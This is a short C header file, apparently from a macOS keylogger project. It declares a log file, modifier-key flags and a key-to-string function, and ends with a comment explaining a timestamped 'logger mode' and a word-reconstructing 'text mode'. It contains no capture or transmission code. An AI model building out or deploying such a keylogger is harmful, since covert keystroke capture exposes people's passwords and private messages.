#ifndef KEYLOGGER_H_
#define KEYLOGGER_H_

#include <ApplicationServices/ApplicationServices.h>
#include <stdbool.h>
#include <string.h>
#include <stdio.h>
#include <time.h>
#include <Carbon/Carbon.h>

// Global Variables
FILE *logfile = NULL;
bool textMode = true;
bool shift = false;
bool cmd = false;
bool option = false;
bool ctrl = false;
bool caps = false;
bool complete =false;
char buffer[100];
int bufferFree = 0;

char * keyToString1 (CGKeyCode);

#endif

/*
Two mode: textmode and loggermode

Logger mode prints out in a logger style format with date, time, and specific keystroke.

Text mode tries to print out in a more readable format like a text file. Tries to print out segment of words or single complete words as oppose to indivual keystrokes. Text mode determines if a segment is complete based on keystroke input of certain keys such as enter, delete, and command. Test mode works to some degree but doesn't always offer the best clarity when it comes to non single character keystrokes or keys that have funtionality. It's set in a way that I think offers the best out of all the format I can think of doing.
 */
